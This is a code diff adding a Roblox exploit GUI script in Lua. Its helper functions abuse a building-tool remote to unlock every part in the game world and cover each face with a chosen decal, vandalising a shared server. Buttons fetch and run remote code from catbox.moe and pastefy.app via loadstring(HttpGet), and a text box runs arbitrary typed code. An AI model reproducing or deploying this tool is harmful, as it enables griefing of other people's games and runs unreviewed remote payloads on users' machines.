+			end	
+			function AddMesh(part)	
+				local args = {	
+					[1] = "CreateMeshes",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			
+			function SetMesh(part,meshid)	
+				local args = {	
+					[1] = "SyncMesh",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["MeshId"] = "rbxassetid://"..meshid	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function SetTexture(part, texid)	
+				local args = {	
+					[1] = "SyncMesh",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["TextureId"] = "rbxassetid://"..texid	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function SetName(part, stringg)	
+				local args = {	
+					[1] = "SetName",	
+					[2] = {	
+						[1] = part	
+					},	
+					[3] = stringg	
+				}	
+			
+				_(args)	
+			end	
+			function MeshResize(part,size)	
+				local args = {	
+					[1] = "SyncMesh",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["Scale"] = size	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function Weld(part1, part2,lead)	
+				local args = {	
+					[1] = "CreateWelds",	
+					[2] = {	
+						[1] = part1,	
+						[2] = part2	
+					},	
+					[3] = lead	
+				}	
+				_(args)	
+			
+			end	
+			function SetLocked(part,boolean)	
+				local args = {	
+					[1] = "SetLocked",	
+					[2] = {	
+						[1] = part	
+					},	
+					[3] = boolean	
+				}	
+				_(args)	
+			end	
+			function SetTrans(part,int)	
+				local args = {	
+					[1] = "SyncMaterial",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["Transparency"] = int	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function CreateSpotlight(part)	
+				local args = {	
+					[1] = "CreateLights",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["LightType"] = "SpotLight"	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function SyncLighting(part,brightness)	
+				local args = {	
+					[1] = "SyncLighting",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["LightType"] = "SpotLight",	
+							["Brightness"] = brightness	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function Color(part,color)	
+				local args = {	
+					[1] = "SyncColor",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["Color"] = color --[[Color3]],	
+							["UnionColoring"] = false	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			function SpawnDecal(part,side)	
+				local args = {	
+					[1] = "CreateTextures",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["Face"] = side,	
+							["TextureType"] = "Decal"	
+						}	
+					}	
+				}	
+			
+				_(args)	
+			end	
+			function AddDecal(part,asset,side)	
+				local args = {	
+					[1] = "SyncTexture",	
+					[2] = {	
+						[1] = {	
+							["Part"] = part,	
+							["Face"] = side,	
+							["TextureType"] = "Decal",	
+							["Texture"] = "rbxassetid://".. asset	
+						}	
+					}	
+				}	
+				_(args)	
+			end	
+			
+			function spam(id)	
+				for i,v in game.workspace:GetDescendants() do	
+					if v:IsA("BasePart") then	
+						spawn(function()	
+							SetLocked(v,false)	
+							SpawnDecal(v,Enum.NormalId.Front)	
+							AddDecal(v,id,Enum.NormalId.Front)	
+			
+							SpawnDecal(v,Enum.NormalId.Back)	
+							AddDecal(v,id,Enum.NormalId.Back)	
+			
+							SpawnDecal(v,Enum.NormalId.Right)	
+							AddDecal(v,id,Enum.NormalId.Right)	
+			
+							SpawnDecal(v,Enum.NormalId.Left)	
+							AddDecal(v,id,Enum.NormalId.Left)	
+			
+							SpawnDecal(v,Enum.NormalId.Bottom)	
+							AddDecal(v,id,Enum.NormalId.Bottom)	
+			
+							SpawnDecal(v,Enum.NormalId.Top)	
+							AddDecal(v,id,Enum.NormalId.Top)	
+						end)	
+					end	
+				end 	
+			end	
+			spam("84535713264454")	
+			        	
+	    end)	
+end;
+task.spawn(C_f);
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton.LocalScript
+local function C_11()
+	local script = LMG2L["LocalScript_11"];
+	local button = script.Parent    	
+	    button.MouseButton1Click:Connect(function()    	
+	loadstring(game:HttpGet("https://files.catbox.moe/lvpji7.txt"))()        	
+	    end)	
+end;
+task.spawn(C_11);
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.Frame.TextButton.LocalScript
+local function C_13()
+	local script = LMG2L["LocalScript_13"];
+	local button = script.Parent    	
+	    button.MouseButton1Click:Connect(function()    	
+	loadstring(game:HttpGet("https://pastefy.app/A13KLlSg/raw"))()        	
+	    end)	
+end;
+task.spawn(C_13);
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextButton.LocalScript
+local function C_15()
+	local script = LMG2L["LocalScript_15"];
+	local btn = script.Parent        	
+	        local box = btn.Parent:WaitForChild("TextBox")        	
+	            	
+	        btn.MouseButton1Click:Connect(function()        	
+	            local code = box.Text        	
+	            if code ~= "" then        	
+	                loadstring(code)()        	
+	            end        	
+	        end)	
+end;
+task.spawn(C_15);
+-- Players.RupertgamingBoyy958.PlayerGui.ScreenGui.Frame.TextButton.LocalScript
+local function C_17()
+	local script = LMG2L["LocalScript_17"];
+	local clear = script.Parent    	
+	    local box = clear.Parent:WaitForChild("TextBox")    	
+	    	
+	    clear.MouseButton1Click:Connect(function()    	
+	        box.Text = ""    	
+	    end)	
+end;
+task.spawn(C_17);
+
+return LMG2L["ScreenGui_1"], require;
